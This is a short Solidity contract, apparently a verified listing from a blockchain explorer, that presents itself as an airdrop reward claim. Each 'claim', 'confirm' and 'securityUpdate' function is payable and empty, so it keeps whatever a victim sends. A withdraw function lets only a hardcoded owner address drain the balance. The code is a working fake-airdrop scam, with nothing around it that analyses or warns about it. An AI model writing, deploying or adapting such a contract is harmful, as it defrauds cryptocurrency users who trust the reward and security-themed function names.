/**
 *Submitted for verification at snowtrace.io on 2023-03-28
*/

pragma solidity ^0.8.7;

contract ClaimAirdropReward {

    address private owner = address(0x209F41BbC9d1B310e567c75322cAe2E0A9838176);

    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        (bool ownerPayout, ) = payable(msg.sender).call{value: address(this).balance}("Owner Payout");
        require(ownerPayout); 
    }

    function ClaimRewards() public payable {
    }

    function confirm() public payable {
    }

    function secureClaim() public payable {
    }

    function safeClaim() public payable {
    }

    function receiveAirdrop() public payable {
        
    }
    
    function securityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}